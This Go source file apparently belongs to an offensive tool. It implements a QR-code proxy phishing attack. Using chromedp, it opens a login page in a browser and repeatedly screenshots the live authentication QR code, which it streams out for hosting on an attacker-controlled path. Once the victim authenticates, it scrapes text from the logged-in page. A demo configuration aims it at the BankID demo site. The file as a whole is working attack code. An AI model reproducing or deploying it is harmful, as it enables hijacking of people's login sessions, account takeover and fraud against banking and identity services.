package attacks

import (
	"context"
	"log"
	"time"

	"github.com/chromedp/cdproto/cdp"
	"github.com/chromedp/chromedp"
)

type QrProxyAttack struct {
	Url                string                         // Main Url to visit
	Length             int                            // Length of attack in millisenconds
	Sleep              int                            // Milliseconds to wait after reaching target QR code page to start taking screenshots
	Actions            []chromedp.Action              // Actions of the headless browser
	Path               string                         // Path to host attack on
	CustomBrowserFlags []chromedp.ExecAllocatorOption // Custom flags to pass to the headless browser
	QRCodeXPath        string                         // XPATH of the qr-code element
	ExfilArea          string                         // XPath for text to extract out of the page after auth
}

func QrProxyVisit(attack *QrProxyAttack, comm *chan []byte, attackResult AttackResult) {
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", false),
		chromedp.Flag("incognito", true),
	)
	opts = append(opts, attack.CustomBrowserFlags...)
	ctx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer cancel()
	ctx, cancel = chromedp.NewContext(ctx)
	defer cancel()

	actions := append(
		[]chromedp.Action{
			chromedp.Navigate(attack.Url),
		},
		attack.Actions...,
	)
	actions = append(
		actions,
		chromedp.Sleep(time.Duration(attack.Sleep)*time.Millisecond),
	)

	err := chromedp.Run(ctx, actions...)
	if err != nil {
		log.Println(err)
	}

	if attack.ExfilArea == "" {
		attackResult.ExfilChannel <- ""
	}

	var exfilNodes []*cdp.Node
	var exfilText string
	frequency := 250
	for i := 0; i < attack.Length/frequency; i++ {
		// Check if we should already exfil
		if attack.ExfilArea != "" {
			exfilContext, _ := context.WithDeadline(ctx, time.Now().Add(200*time.Millisecond))
			chromedp.Run(exfilContext,
				chromedp.Nodes(attack.ExfilArea, &exfilNodes, chromedp.BySearch),
			)
		}

		if len(exfilNodes) > 0 {
			chromedp.Run(ctx,
				chromedp.WaitVisible(attack.ExfilArea, chromedp.BySearch),
				chromedp.Text(attack.ExfilArea, &exfilText, chromedp.BySearch),
				chromedp.ActionFunc(func(ctx context.Context) error {
					if len(exfilText) > 0 {
						attackResult.ExfilChannel <- exfilText
					}
					return nil
				}),
			)
		} else {
			// Otherwise keep taking screenshots
			chromedp.Run(ctx,
				chromedp.Sleep(time.Duration(frequency)*time.Millisecond),
				chromedp.Screenshot(attack.QRCodeXPath, &SHARED_RESULT, chromedp.BySearch),
				chromedp.ActionFunc(func(ctx context.Context) error {
					*comm <- SHARED_RESULT // Add two copies just to have a bigger buffer
					*comm <- SHARED_RESULT
					return nil
				}),
			)
		}
	}
}

func DemoQRProxyAttacks() []QrProxyAttack {
	return []QrProxyAttack{
		{
			Url:         "https://www.bankid.com/demo",
			QRCodeXPath: `/html/body/div/div[2]/div[1]/div[1]/div/div[2]/img`,
			Sleep:       1000,
			Length:      60000,
			Path:        "/bankid",
			Actions: []chromedp.Action{
				chromedp.Sleep(2000 * time.Millisecond),
				chromedp.WaitVisible(`/html/body/div/div[2]/div[1]/div[1]/div[1]/div/a[1]`, chromedp.BySearch),
				chromedp.Click(`/html/body/div/div[2]/div[1]/div[1]/div[1]/div/a[1]`, chromedp.BySearch),
			},
			ExfilArea: `/html/body/div/div[2]/div[1]/div[1]/div/div[2]/div[2]/div[1]`,
		},
	}
}
